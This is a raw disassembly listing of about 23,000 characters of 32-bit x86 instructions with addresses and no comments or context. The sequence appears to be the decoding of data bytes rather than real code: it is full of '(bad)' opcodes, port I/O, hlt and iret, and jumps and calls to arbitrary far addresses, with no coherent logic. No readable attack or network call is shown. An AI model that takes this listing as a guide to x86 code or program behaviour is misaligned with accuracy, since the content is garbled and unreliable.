  421568:	sub    cl,BYTE PTR [ecx]
  42156a:	mov    ebp,0x8ee4b191
  42156f:	lea    edi,[edx-0x43]
  421572:	shl    DWORD PTR [edi],cl
  421574:	outs   dx,DWORD PTR ds:[esi]
  421575:	mov    DWORD PTR [ebx-0x2977b16f],esp
  42157b:	not    DWORD PTR [eax-0x45187bc8]
  421581:	xchg   DWORD PTR ds:[edx],esp
  421584:	es sbb al,0x7b
  421587:	lods   al,BYTE PTR ds:[esi]
  421588:	scas   al,BYTE PTR es:[edi]
  421589:	push   esi
  42158a:	leave  
  42158b:	mov    cl,0xc4
  42158d:	mov    esp,0xfa280e1a
  421592:	es sub al,0x14
  421595:	scas   al,BYTE PTR es:[edi]
  421596:	mov    edx,0xf0e65c86
  42159b:	mov    dl,0x7a
  42159d:	fcomp  DWORD PTR [edx]
  42159f:	fiadd  DWORD PTR [edi-0x75]
  4215a2:	ret    
  4215a3:	mov    BYTE PTR [esi+0x5dd97b57],bh
  4215a9:	pop    esi
  4215aa:	cmp    BYTE PTR [edx-0x18],ah
  4215ad:	add    BYTE PTR [eax],0x6d
  4215b0:	fdivp  st(6),st
  4215b2:	inc    edi
  4215b3:	and    eax,0x11b45e6a
  4215b8:	inc    edx
  4215b9:	enter  0x4871,0xe3
  4215bd:	sbb    eax,0xf8d22f6d
  4215c2:	in     al,dx
  4215c3:	jmp    0xdcd6:0x1af73825
  4215ca:	rol    DWORD PTR ds:0x61fd3bd2,0xf5
  4215d1:	mov    ch,0x3e
  4215d3:	pop    ecx
  4215d4:	call   0x5c7b5132
  4215d9:	xor    eax,0x90637262
  4215de:	(bad)  
  4215df:	xor    cl,BYTE PTR [eax+0x5c]
  4215e2:	aam    0x7e
  4215e4:	or     cl,dh
  4215e6:	mov    ebp,DWORD PTR [ebp+0x729b64c4]
  4215ec:	jb     0x4215d8
  4215ee:	je     0x421618
  4215f0:	mov    eax,ds:0xc7b50c86
  4215f5:	inc    ecx
  4215f6:	pop    ecx
  4215f7:	xchg   edi,eax
  4215f8:	mov    eax,0xe3883c81
  4215fd:	jns    0x421626
  4215ff:	jno    0x421654
  421601:	aad    0xfb
  421603:	mov    DWORD PTR [ecx-0x1e310a4],esp
  421609:	mov    ecx,ebp
  42160b:	test   BYTE PTR [ebp+0x69c22602],al
  421611:	jae    0x42162c
  421613:	inc    ebx
  421614:	iret   
  421615:	push   ds
  421616:	xchg   edi,eax
  421617:	data16 (bad) 
  421619:	hlt    
  42161a:	mov    edx,0xf40cdc6a
  42161f:	xchg   esp,eax
  421620:	shr    esp,cl
  421622:	loop   0x4215c0
  421624:	sub    esi,eax
  421626:	ret    0x9036
  421629:	cvttps2pi mm3,QWORD PTR [eax-0x31]
  42162d:	pop    edi
  42162e:	push   edx
  42162f:	and    ebp,ebx
  421631:	push   eax
  421632:	sbb    cl,dh
  421634:	xor    dl,BYTE PTR [ebx+ebx*8]
  421637:	icebp  
  421638:	or     bh,dh
  42163a:	cmp    ebx,DWORD PTR [esi+0x3c]
  42163d:	mov    edi,0xe047db08
  421642:	fiadd  DWORD PTR [eax-0x66]
  421645:	inc    ecx
  421646:	sbb    eax,0xa112d9aa
  42164b:	or     bl,BYTE PTR [esi+0x9]
  42164e:	scas   al,BYTE PTR es:[edi]
  42164f:	stos   DWORD PTR es:[edi],eax
  421650:	es dec ebx
  421652:	test   al,0x4c
  421654:	pop    ebx
  421655:	jmp    0x63867ccf
  42165a:	cmp    DWORD PTR [ebp+0x28],0xd4818a33
  421661:	xor    BYTE PTR [edx+0x3c0147c4],bh
  421667:	sti    
  421668:	cmp    ch,dh
  42166a:	repnz ror DWORD PTR [esi+ecx*4-0x164ab054],0xcc
  421673:	adc    al,0xf6
  421675:	adc    eax,0x3cba8d08
  42167a:	sub    DWORD PTR [eax+0x36c10c31],ebx
  421680:	int3   
  421681:	hlt    
  421682:	pop    ebp
  421683:	add    BYTE PTR [ecx],0x3d
  421686:	rcr    DWORD PTR [ebx-0x5a21613b],1
  42168c:	lods   al,BYTE PTR ds:[esi]
  42168d:	ja     0x421675
  42168f:	push   esp
  421690:	inc    esi
  421691:	cdq    
  421692:	inc    ecx
  421693:	test   DWORD PTR [edx-0x6f40964f],ebp
  421699:	mov    eax,0xa40b9e93
  42169e:	xor    al,0x86
  4216a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216a1:	fnsave [ebp-0x24]
  4216a4:	push   ss
  4216a5:	mov    ch,0xfc
  4216a7:	ret    
  4216a8:	ja     0x421691
  4216aa:	pushf  
  4216ab:	(bad)  
  4216ac:	fcomp  DWORD PTR [edx]
  4216ae:	inc    ebx
  4216af:	mov    eax,0xd061367c
  4216b4:	sahf   
  4216b5:	mov    BYTE PTR [edi+eax*2],dh
  4216b8:	xchg   BYTE PTR [edx+0x55d0bbee],dl
  4216be:	in     eax,dx
  4216bf:	ror    DWORD PTR [ebp-0x45f9a904],cl
  4216c5:	and    eax,0xb77444ba
  4216ca:	cmp    eax,0x46544e9a
  4216cf:	nop
  4216d0:	iret   
  4216d1:	add    eax,0x1b7ddb46
  4216d6:	dec    edx
  4216d7:	sbb    eax,DWORD PTR [esi+0x60]
  4216da:	mov    edi,0xc1a0eee5
  4216df:	jmp    0x421750
  4216e1:	jns    0x421704
  4216e3:	mov    bh,0x62
  4216e5:	add    al,0x1e
  4216e7:	or     eax,0xeeed0d6c
  4216ec:	xlat   BYTE PTR ds:[ebx]
  4216ed:	mov    ds:0x40ad1df5,al
  4216f2:	xor    al,0xf9
  4216f4:	das    
  4216f5:	adc    DWORD PTR [ecx-0x73],edi
  4216f8:	xor    eax,0xe7aa32ca
  4216fd:	mov    al,ds:0x3521dad5
  421702:	adc    edx,DWORD PTR [esi-0x3e]
  421705:	add    al,0x11
  421707:	sub    ecx,esi
  421709:	lds    ecx,FWORD PTR [esi-0x3e7bd044]
  42170f:	mov    ds:0x4c390711,al
  421714:	sbb    BYTE PTR [edx+0x5d],al
  421717:	pop    edx
  421718:	les    ebp,FWORD PTR [edx-0x16]
  42171b:	out    0x89,eax
  42171d:	loop   0x42171f
  42171f:	jge    0x42176d
  421721:	sub    edx,DWORD PTR [ebp+0x3422eda]
  421727:	(bad)  
  421728:	or     esi,DWORD PTR ds:0x11efb7a9
  42172e:	cmp    DWORD PTR [edi],0xb55ee0d9
  421734:	test   al,0x68
  421736:	fmul   QWORD PTR [ebp+0x2d2d4e7e]
  42173c:	lods   al,BYTE PTR ds:[esi]
  42173d:	cwde   
  42173e:	push   ds
  42173f:	jns    0x4217ae
  421741:	loopne 0x421758
  421743:	jl     0x421747
  421745:	xchg   dl,bh
  421747:	pusha  
  421748:	xor    BYTE PTR [ebx],ch
  42174a:	add    eax,0xbc770b8a
  42174f:	and    ebx,DWORD PTR [eax]
  421751:	xlat   BYTE PTR ds:[ebx]
  421752:	jns    0x421716
  421754:	loopne 0x421728
  421756:	xchg   ecx,eax
  421757:	pop    eax
  421758:	lock push 0xffffffa2
  42175b:	popf   
  42175c:	pop    edi
  42175d:	call   0x55ca:0x49ffee2b
  421764:	dec    ebp
  421765:	add    DWORD PTR [esi-0x7c],edi
  421768:	fisub  DWORD PTR [ebp+0xf]
  42176b:	inc    esi
  42176c:	xchg   dh,bh
  42176e:	loopne 0x42174a
  421770:	xchg   ebp,eax
  421771:	fucom  st(7)
  421773:	add    ch,BYTE PTR [esi+ecx*2-0x3a]
  421777:	mov    esp,0xbdf5f203
  42177c:	pop    ebx
  42177d:	push   eax
  42177e:	aaa    
  42177f:	mov    dh,0xf2
  421781:	fs mov ebx,0xa69a4cef
  421787:	jecxz  0x4217eb
  421789:	adc    eax,DWORD PTR cs:[edx-0x180f9684]
  421790:	sbb    eax,0xd99ff978
  421795:	mov    ecx,0x983600e
  42179a:	int    0x60
  42179c:	enter  0xcf10,0x57
  4217a0:	cmp    DWORD PTR [eax-0xd],esp
  4217a3:	mov    ebx,0x841da56d
  4217a8:	sbb    eax,0x481a54b6
  4217ad:	dec    edi
  4217ae:	inc    edi
  4217af:	mov    esi,0xf8a80856
  4217b4:	aaa    
  4217b5:	mov    eax,ds:0x11db64b0
  4217ba:	clc    
  4217bb:	sub    al,0x33
  4217bd:	push   edx
  4217be:	out    0xe2,al
  4217c0:	cmp    DWORD PTR [ebp+0x48],ebp
  4217c3:	cwde   
  4217c4:	call   0x8e57779
  4217c9:	cmp    DWORD PTR [eax],eax
  4217cb:	stc    
  4217cc:	add    eax,0x277de7e4
  4217d1:	sti    
  4217d2:	push   ax
  4217d4:	shr    DWORD PTR [edi],0x1a
  4217d7:	push   eax
  4217d8:	mov    edx,0x6a2fd243
  4217dd:	adc    al,0x5c
  4217df:	test   al,0x1a
  4217e1:	clc    
  4217e2:	xchg   edi,eax
  4217e3:	sar    edx,cl
  4217e5:	or     ah,ch
  4217e7:	std    
  4217e8:	push   edx
  4217e9:	shr    DWORD PTR [edx+0x50],1
  4217ec:	inc    ebx
  4217ed:	xchg   BYTE PTR [eax+0x68],dl
  4217f0:	inc    edi
  4217f1:	icebp  
  4217f2:	mov    edi,0xa3a7226a
  4217f7:	repz pop ds
  4217f9:	sub    DWORD PTR [edi+0x46],edi
  4217fc:	add    bh,BYTE PTR [eax+0x3f102870]
  421802:	lods   al,BYTE PTR ds:[esi]
  421803:	or     BYTE PTR [ecx+edi*8-0x21],ch
  421807:	(bad)  
  421808:	sub    BYTE PTR [esi+0x53],bh
  42180b:	mov    ds:0x2d73c3f5,al
  421810:	and    al,0x2d
  421812:	mov    ecx,0x4d2218b6
  421817:	sub    BYTE PTR [eax+eiz*4+0x0],ch
  42181b:	cmp    al,0xef
  42181d:	cmp    ah,BYTE PTR [ebx+esi*2-0x520abeb1]
  421824:	xor    eax,0x666cdce9
  421829:	mov    ch,0xfe
  42182b:	add    DWORD PTR [edx],esp
  42182d:	test   DWORD PTR [esi-0x77],eax
  421830:	test   eax,0xf31aedc1
  421835:	jmp    0x421827
  421837:	xchg   edi,eax
  421838:	adc    ch,BYTE PTR ds:0xa666f725
  42183e:	int    0x33
  421840:	div    BYTE PTR ds:0xad7a82d1
  421846:	stos   DWORD PTR es:[edi],eax
  421847:	inc    ebx
  421848:	das    
  421849:	and    al,0x79
  42184b:	sbb    dl,BYTE PTR [edx+0x41830f5c]
  421851:	mov    esi,0x14da5a6a
  421856:	ds in  al,0x24
  421859:	lock out dx,al
  42185b:	aam    0xa6
  42185d:	ror    BYTE PTR [edi+0x31c7367d],0x4d
  421864:	ss mov ah,0xe7
  421867:	stos   BYTE PTR es:[edi],al
  421868:	out    0x53,al
  42186a:	repz xchg ebx,eax
  42186c:	push   esp
  42186d:	mov    edi,0x6c491ba8
  421872:	xor    edx,edi
  421874:	inc    esi
  421875:	pushf  
  421876:	sub    DWORD PTR [ebx-0x23f2d4b9],edx
  42187c:	fld    st(0)
  42187e:	inc    eax
  42187f:	mov    gs,WORD PTR [edx]
  421881:	sub    DWORD PTR [ebp-0x2],edx
  421884:	imul   eax,DWORD PTR [esi],0x7d
  421887:	sbb    ecx,DWORD PTR [edx+0x4d]
  42188a:	inc    esp
  42188b:	ins    DWORD PTR es:[edi],dx
  42188c:	sub    ebp,DWORD PTR [edi+0x392d9180]
  421892:	push   ebp
  421893:	out    0x77,al
  421895:	or     al,0xb6
  421897:	push   esp
  421898:	jno    0x42185e
  42189a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42189b:	inc    ebp
  42189c:	dec    ebp
  42189d:	lds    ebp,FWORD PTR [ebx]
  42189f:	add    bh,ch
  4218a1:	push   eax
  4218a2:	dec    esi
  4218a3:	sbb    BYTE PTR [esi],0xb0
  4218a6:	sbb    DWORD PTR [edi-0x2],esp
  4218a9:	pop    edx
  4218aa:	lea    esi,[esi-0x235399e1]
  4218b0:	daa    
  4218b1:	or     al,0xd0
  4218b3:	lahf   
  4218b4:	aam    0x3e
  4218b6:	mov    ebp,0xc3c4690e
  4218bb:	imul   ecx,DWORD PTR [ebx+0x5ea749b2],0xffffffbe
  4218c2:	push   esi
  4218c3:	xor    al,0xbe
  4218c5:	arpl   sp,bx
  4218c7:	ins    DWORD PTR es:[edi],dx
  4218c8:	inc    ebx
  4218c9:	retf   0xb8d1
  4218cc:	lahf   
  4218cd:	adc    al,BYTE PTR [edi]
  4218cf:	bound  esp,QWORD PTR [edi-0x42]
  4218d2:	outs   dx,DWORD PTR ds:[esi]
  4218d3:	mov    ch,0x70
  4218d5:	pop    eax
  4218d6:	sbb    ebp,DWORD PTR [eax-0x18ec9bf0]
  4218dc:	sbb    ecx,DWORD PTR [eax+0x3a048f11]
  4218e2:	cs cmp ebp,0x5099d42c
  4218e9:	or     al,0x25
  4218eb:	test   al,0xda
  4218ed:	push   0xffffffc1
  4218ef:	scas   al,BYTE PTR es:[edi]
  4218f0:	std    
  4218f1:	mov    bl,0xdf
  4218f3:	dec    edx
  4218f4:	imul   eax,edi,0x9
  4218f7:	inc    eax
  4218f8:	neg    DWORD PTR [ecx]
  4218fa:	sbb    DWORD PTR [edi-0x16],esp
  4218fd:	cli    
  4218fe:	jns    0x42189e
  421900:	inc    edi
  421901:	inc    edx
  421902:	(bad)  
  421903:	iret   
  421904:	fsub   DWORD PTR [edx]
  421906:	int    0xa3
  421908:	add    edi,DWORD PTR [ecx-0xd0e6901]
  42190e:	inc    ebp
  42190f:	imul   eax,esi,0x24
  421912:	push   ds
  421913:	jno    0x4218a3
  421915:	inc    ebx
  421916:	jecxz  0x42194b
  421918:	clc    
  421919:	jmp    0x421e2b
  42191e:	sar    DWORD PTR [edi],cl
  421920:	int3   
  421921:	int3   
  421922:	int3   
  421923:	rcl    ebx,cl
  421925:	aas    
  421926:	in     al,0x4c
  421928:	mov    bh,0x25
  42192a:	pop    es
  42192b:	je     0x42193a
  42192d:	inc    edx
  42192e:	jno    0x42199e
  421930:	jg     0x4219aa
  421932:	jae    0x4219b0
  421934:	js     0x4219ae
  421936:	mov    ecx,0xbbc6a2dc
  42193b:	fadd   QWORD PTR [edi-0x7d]
  42193e:	add    ebp,ebx
  421940:	inc    eax
  421941:	test   BYTE PTR gs:[esi+ecx*8+0x32725366],dh
  421949:	fisttp DWORD PTR [eax+0x104f1dda]
  42194f:	mov    al,0xae
  421951:	add    dh,BYTE PTR [esi+0x1c0ce615]
  421957:	xchg   BYTE PTR [ebp-0x70],ch
  42195a:	stos   BYTE PTR es:[edi],al
  42195b:	mov    bh,BYTE PTR [ebx]
  42195d:	or     BYTE PTR [edi+ebx*8],cl
  421960:	pop    ecx
  421961:	shl    ch,1
  421963:	clc    
  421964:	mov    esp,0x1fffbf90
  421969:	add    bl,BYTE PTR es:[edx-0x5a]
  42196d:	out    0x41,eax
  42196f:	pop    ds
  421970:	sub    DWORD PTR ds:0x283fb570,esp
  421976:	idiv   BYTE PTR [ebp-0x1fad5bce]
  42197c:	out    dx,al
  42197d:	cmp    esp,ebx
  42197f:	jo     0x4219fc
  421981:	test   al,0xb3
  421983:	jno    0x4219dc
  421985:	out    dx,al
  421986:	ins    DWORD PTR es:[edi],dx
  421987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421988:	push   edx
  421989:	repnz test DWORD PTR [ecx],ebp
  42198c:	mov    ecx,0xc1674441
  421991:	lods   al,BYTE PTR ds:[esi]
  421992:	sbb    ch,al
  421994:	push   cs
  421995:	out    0x6c,eax
  421997:	frstor [eax]
  421999:	stos   DWORD PTR es:[edi],eax
  42199a:	outs   dx,BYTE PTR ds:[esi]
  42199b:	mov    ds:0xe601d752,eax
  4219a0:	nop
  4219a1:	ror    BYTE PTR [ebp+0x1],cl
  4219a4:	stos   BYTE PTR es:[edi],al
  4219a5:	inc    esp
  4219a6:	jge    0x4219fd
  4219a8:	pop    ebp
  4219a9:	pop    eax
  4219aa:	stc    
  4219ab:	aad    0xb1
  4219ad:	loope  0x421938
  4219af:	stc    
  4219b0:	mov    esp,0xfd8484d6
  4219b5:	jg     0x421a28
  4219b7:	out    dx,eax
  4219b8:	mov    BYTE PTR [edi+0x760a2e95],0x66
  4219bf:	(bad)  [edx+ebx*4+0x67]
  4219c3:	mov    al,0xe8
  4219c5:	pop    esi
  4219c6:	inc    ebx
  4219c7:	inc    esp
  4219c8:	out    dx,eax
  4219c9:	sbb    BYTE PTR [edx+0x50],al
  4219cc:	fs add eax,0x9662930c
  4219d2:	ret    0xb6d5
  4219d5:	xchg   ecx,eax
  4219d6:	mov    edx,0x33c3d99a
  4219db:	and    BYTE PTR ds:0xe6e4435f,0xea
  4219e2:	inc    esi
  4219e3:	xor    bh,ah
  4219e5:	xor    eax,0x7d0033fc
  4219ea:	in     al,dx
  4219eb:	mov    esi,0x7051c95f
  4219f0:	inc    esp
  4219f1:	add    al,0x91
  4219f3:	xor    ebx,esp
  4219f5:	loopne 0x421998
  4219f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219f8:	mov    ch,0x88
  4219fa:	out    dx,eax
  4219fb:	push   edi
  4219fc:	retf   
  4219fd:	mov    ds:0x267298db,eax
  421a02:	sub    al,BYTE PTR [esi+0x2e]
  421a05:	jns    0x4219a7
  421a07:	sub    DWORD PTR [ebx+0x455d1312],0xffffff91
  421a0e:	sub    al,BYTE PTR [ebp+eiz*2+0x40]
  421a12:	test   al,0x3a
  421a14:	mov    al,ds:0x1be01618
  421a19:	jp     0x421a2b
  421a1b:	mov    dl,0xca
  421a1d:	lock out 0xba,eax
  421a20:	mov    esp,0xb012e18d
  421a25:	pushf  
  421a26:	fld    QWORD PTR [ecx-0x14]
  421a29:	mov    esi,0x9ab234c
  421a2e:	adc    edi,DWORD PTR cs:[ebx]
  421a31:	adc    eax,ebp
  421a33:	les    esp,FWORD PTR [eax]
  421a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a36:	mov    edx,0x2944b714
  421a3b:	aaa    
  421a3c:	adc    edi,DWORD PTR [esi+0x529d70cc]
  421a42:	mov    al,0xde
  421a44:	icebp  
  421a45:	and    cl,BYTE PTR [esi-0x7e]
  421a48:	fcom   QWORD PTR [edx+eax*8+0x47]
  421a4c:	out    0xd5,al
  421a4e:	es xchg ebp,eax
  421a50:	inc    esi
  421a51:	hlt    
  421a52:	push   ecx
  421a53:	test   BYTE PTR [ebp-0x52571e8e],dh
  421a59:	cwde   
  421a5a:	outs   dx,DWORD PTR ds:[esi]
  421a5b:	icebp  
  421a5c:	jle    0x421a8f
  421a5e:	mov    dh,0xc5
  421a60:	cmp    DWORD PTR [esi+0x3c3d7fd],0xfffffff3
  421a67:	(bad)  [ebx-0x64520c50]
  421a6d:	in     al,dx
  421a6e:	bound  ecx,QWORD PTR [edi]
  421a70:	leave  
  421a71:	sbb    BYTE PTR [esi-0xf],0xf5
  421a75:	stos   DWORD PTR es:[edi],eax
  421a76:	scas   al,BYTE PTR es:[edi]
  421a77:	xchg   ecx,eax
  421a78:	mov    edx,0x3506b2f9
  421a7d:	adc    edx,esp
  421a7f:	jle    0x421a13
  421a81:	arpl   WORD PTR [ebx-0x4f823d3e],bx
  421a87:	jg     0x421aea
  421a89:	inc    eax
  421a8a:	inc    eax
  421a8b:	repnz cmp BYTE PTR [edi+0x12d4f8ab],0x42
  421a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a94:	sbb    BYTE PTR [ebx+0x5a7fdd32],bl
  421a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a9b:	adc    dl,BYTE PTR ds:0xd2cbd0b1
  421aa1:	xor    eax,0x7f2497fd
  421aa6:	mov    dh,0x3b
  421aa8:	cs adc dh,bl
  421aab:	in     al,dx
  421aac:	inc    ebx
  421aad:	and    ch,BYTE PTR [ecx]
  421aaf:	cwde   
  421ab0:	iret   
  421ab1:	fstp   st(7)
  421ab3:	fadd   st,st(4)
  421ab5:	mov    ecx,DWORD PTR [ecx+0x64e46fde]
  421abb:	lock sub BYTE PTR [ebp-0x68],cl
  421abf:	bound  esi,QWORD PTR [esi-0x49]
  421ac2:	repnz loope 0x421b0d
  421ac5:	or     BYTE PTR [ebx],cl
  421ac7:	(bad)  
  421aca:	mov    edi,0x15a4bf25
  421acf:	sbb    DWORD PTR [edx],esi
  421ad1:	push   cs
  421ad2:	(bad)  
  421ad3:	arpl   ax,cx
  421ad5:	repz inc ecx
  421ad7:	std    
  421ad8:	xor    eax,0xe0143ba3
  421add:	addr16 add ecx,esi
  421ae0:	push   es
  421ae1:	xchg   ecx,eax
  421ae2:	mov    cs,WORD PTR [edx+0x3f248e3c]
  421ae8:	retf   
  421ae9:	push   esp
  421aea:	mov    WORD PTR [esi-0x784d2631],ss
  421af0:	nop
  421af1:	jge    0x421b13
  421af3:	add    bl,bl
  421af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421af6:	mov    dl,0x93
  421af8:	je     0x421b07
  421afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421afb:	xor    DWORD PTR [edi-0x58ab9ac3],edi
  421b01:	in     al,dx
  421b02:	mov    WORD PTR [ebx],ds
  421b04:	sti    
  421b05:	cdq    
  421b06:	xchg   BYTE PTR [ebx],cl
  421b08:	cmp    al,BYTE PTR [edx-0x7b]
  421b0b:	popa   
  421b0c:	mov    al,ds:0xc8528b38
  421b11:	enter  0x1c1d,0x70
  421b15:	in     eax,dx
  421b16:	pop    ebx
  421b17:	and    BYTE PTR [ecx],ch
  421b19:	loop   0x421b3e
  421b1b:	add    DWORD PTR [esi-0x168935ab],0x79
  421b22:	pop    eax
  421b23:	test   eax,0x81b34c09
  421b28:	and    bl,BYTE PTR ds:0xf065d90
  421b2e:	out    dx,al
  421b2f:	xor    BYTE PTR [ebp+0x2b577e79],0xc1
  421b36:	ins    DWORD PTR es:[edi],dx
  421b37:	push   ebp
  421b38:	stos   BYTE PTR es:[edi],al
  421b39:	mov    ds:0xfe7dcb9e,al
  421b3e:	add    BYTE PTR [edi],0x9a
  421b41:	call   0xb9a7:0x57a2e541
  421b48:	mov    edi,0x78fcdc12
  421b4d:	je     0x421b79
  421b4f:	lds    ecx,FWORD PTR [ecx+0x1]
  421b52:	aaa    
  421b53:	stos   DWORD PTR es:[edi],eax
  421b54:	or     ecx,DWORD PTR [ebx]
  421b56:	add    BYTE PTR [ecx],0x4c
  421b59:	cli    
  421b5a:	scas   eax,DWORD PTR es:[edi]
  421b5b:	adc    BYTE PTR [edi+0x19],0x8a
  421b5f:	xchg   esi,eax
  421b60:	sbb    al,0x1a
  421b62:	mov    ah,0x75
  421b64:	(bad)  
  421b65:	pop    edi
  421b66:	adc    esi,esp
  421b68:	pop    eax
  421b69:	or     ebx,eax
  421b6b:	fidiv  WORD PTR [edi-0x26d2f7de]
  421b71:	and    eax,0x1d36745d
  421b76:	and    DWORD PTR [ebx+0x7fd75530],ebp
  421b7c:	fisubr DWORD PTR [esp+eiz*8]
  421b7f:	cs dec eax
  421b81:	jge    0x421bfb
  421b83:	loop   0x421b7c
  421b85:	pop    ss
  421b86:	aaa    
  421b87:	xlat   BYTE PTR ds:[ebx]
  421b88:	in     eax,0xd5
  421b8a:	pop    edx
  421b8b:	jle    0x421b40
  421b8d:	adc    al,0x3a
  421b8f:	xor    al,0x41
  421b91:	retf   0xe51
  421b94:	and    eax,0xabbd4dc9
  421b99:	stos   BYTE PTR es:[edi],al
  421b9a:	or     al,0x11
  421b9c:	mov    ah,0x40
  421b9e:	repnz push cs
  421ba0:	mov    bl,0x9d
  421ba2:	or     DWORD PTR [eax],ebp
  421ba4:	dec    ecx
  421ba5:	inc    edx
  421ba6:	ins    DWORD PTR es:[edi],dx
  421ba7:	nop
  421ba8:	(bad)  
  421ba9:	cmp    al,0xb2
  421bab:	adc    eax,0xe51d5987
  421bb0:	pop    eax
  421bb1:	mov    es,edi
  421bb3:	jecxz  0x421b5e
  421bb5:	cli    
  421bb6:	mov    esp,0xb7cc55a9
  421bbb:	mov    dh,BYTE PTR [esi-0x10]
  421bbe:	je     0x421c1e
  421bc0:	push   ecx
  421bc1:	repnz mov ds:0x125e6eba,eax
  421bc7:	jmp    0x7dc236d8
  421bcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bcd:	bound  edi,QWORD PTR [esi+0x9cad582]
  421bd3:	mov    ebx,0x9a94a4d7
  421bd8:	add    eax,ebp
  421bda:	xchg   BYTE PTR [esi+0x3c],cl
  421bdd:	popf   
  421bde:	lods   al,BYTE PTR ds:[esi]
  421bdf:	je     0x421bc4
  421be1:	inc    esp
  421be2:	mov    ch,0xef
  421be4:	and    al,0xdf
  421be6:	jle    0x421bfb
  421be8:	bound  ebp,QWORD PTR [edx-0x1ddea0c4]
  421bee:	xor    eax,0xa63158f0
  421bf3:	nop
  421bf4:	cmp    BYTE PTR [edi-0x23492048],ch
  421bfa:	loope  0x421c5f
  421bfc:	les    ecx,FWORD PTR [esi+0x77]
  421bff:	mov    eax,ds:0x26f5f3f2
  421c04:	and    DWORD PTR [ebx+0x33],edx
  421c07:	mov    ebx,0x3d3f5094
  421c0c:	push   eax
  421c0d:	jecxz  0x421bdc
  421c0f:	loope  0x421bd8
  421c11:	cmp    ah,BYTE PTR [ebp+0x36538a33]
  421c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c18:	fwait
  421c19:	stc    
  421c1a:	stos   DWORD PTR es:[edi],eax
  421c1b:	jns    0x421bde
  421c1d:	dec    BYTE PTR [ebx+ebp*4+0x77]
  421c21:	pop    ds
  421c22:	and    DWORD PTR [edi-0x1dc4adab],esi
  421c28:	add    bh,BYTE PTR [bp+di+0x3455]
  421c2d:	test   BYTE PTR ds:0x34b7d58a,ch
  421c33:	pusha  
  421c34:	push   0x42
  421c36:	fidivr DWORD PTR [eax-0x21]
  421c39:	xchg   esp,eax
  421c3a:	mov    ah,0x54
  421c3c:	pop    ss
  421c3d:	outs   dx,BYTE PTR ds:[esi]
  421c3e:	scas   al,BYTE PTR es:[edi]
  421c3f:	aad    0x19
  421c41:	xor    al,0xb5
  421c43:	not    DWORD PTR [edx-0x4a]
  421c46:	call   0x715c0866
  421c4b:	je     0x421c68
  421c4d:	jle    0x421c24
  421c4f:	cmp    al,0x97
  421c51:	lds    ebp,FWORD PTR [esi+0x68f78e6d]
  421c57:	pop    eax
  421c58:	psrld  mm0,mm0
  421c5b:	fld    DWORD PTR [ecx]
  421c5d:	pop    eax
  421c5e:	test   eax,0x1dde4037
  421c63:	imul   edx,DWORD PTR ds:0x5dd63218,0x1e
  421c6a:	call   0x7885e1c0
  421c6f:	mov    ch,0xe5
  421c71:	adc    bh,BYTE PTR gs:[ebp-0x7544ef1c]
  421c78:	lods   eax,DWORD PTR ds:[esi]
  421c79:	(bad)  
  421c7a:	aam    0x25
  421c7c:	iret   
  421c7d:	and    al,0x74
  421c7f:	adc    BYTE PTR [esi],ch
  421c81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c82:	xor    DWORD PTR [ebx-0x3dece17f],esp
  421c88:	push   0xc
  421c8a:	add    al,0x78
  421c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c8d:	adc    al,0x52
  421c8f:	dec    esi
  421c90:	iret   
  421c91:	inc    ecx
  421c92:	sub    ecx,DWORD PTR [ecx+0x3f]
  421c95:	aad    0xf6
  421c97:	dec    esi
  421c98:	leave  
  421c99:	xor    DWORD PTR [ebp+eax*4+0x723eba0a],0x40
  421ca1:	std    
  421ca2:	pop    es
  421ca3:	dec    edx
  421ca4:	add    al,0xf7
  421ca6:	inc    edi
  421ca7:	inc    esp
  421ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ca9:	mov    bh,0x38
  421cab:	xchg   ebp,eax
  421cac:	clc    
  421cad:	test   eax,0xcfef4037
  421cb2:	mov    dl,0x3b
  421cb4:	in     eax,0x9a
  421cb6:	jmp    0x9483:0xd9b0651e
  421cbd:	ficomp DWORD PTR [ebx+0xd]
  421cc0:	xchg   edx,eax
  421cc1:	test   BYTE PTR [edx+edi*4+0x63],ah
  421cc5:	jp     0x421c4e
  421cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cc8:	mov    esi,0x60e4c88c
  421ccd:	push   0x79
  421ccf:	cs pop ebp
  421cd1:	xchg   edi,eax
  421cd2:	out    0x53,al
  421cd4:	dec    edi
  421cd5:	pop    ecx
  421cd6:	lds    ebp,FWORD PTR [edi+0x33]
  421cd9:	mov    bl,BYTE PTR [ecx+0x1ca654f0]
  421cdf:	xchg   ecx,esi
  421ce1:	repz inc esp
  421ce3:	mov    ebp,0x148a5bad
  421ce8:	sub    DWORD PTR [esp+esi*1],esi
  421ceb:	inc    esi
  421cec:	sti    
  421ced:	cmp    BYTE PTR [ebx-0x1b3bd3d5],cl
  421cf3:	xlat   BYTE PTR ds:[ebx]
  421cf4:	inc    eax
  421cf5:	mov    ds:0xfa8fd5f3,al
  421cfa:	enter  0xc9af,0x7a
  421cfe:	packuswb mm1,QWORD PTR [ecx-0x39]
  421d02:	mov    ch,0x81
  421d04:	inc    ebp
  421d05:	(bad)  [edx+0x17]
  421d08:	push   0x61
  421d0a:	jle    0x421ce7
  421d0c:	adc    cl,BYTE PTR [eax]
  421d0e:	je     0x421cea
  421d10:	or     DWORD PTR [edx+ebp*1-0xc],ecx
  421d14:	ins    DWORD PTR es:[edi],dx
  421d15:	repnz inc eax
  421d17:	or     ebp,esp
  421d19:	in     eax,dx
  421d1a:	pop    es
  421d1b:	stos   BYTE PTR es:[edi],al
  421d1c:	test   al,0x75
  421d1e:	mov    ebp,0x874b1df1
  421d23:	fst    DWORD PTR [edi]
  421d25:	xlat   BYTE PTR ds:[ebx]
  421d26:	mov    bl,0xaa
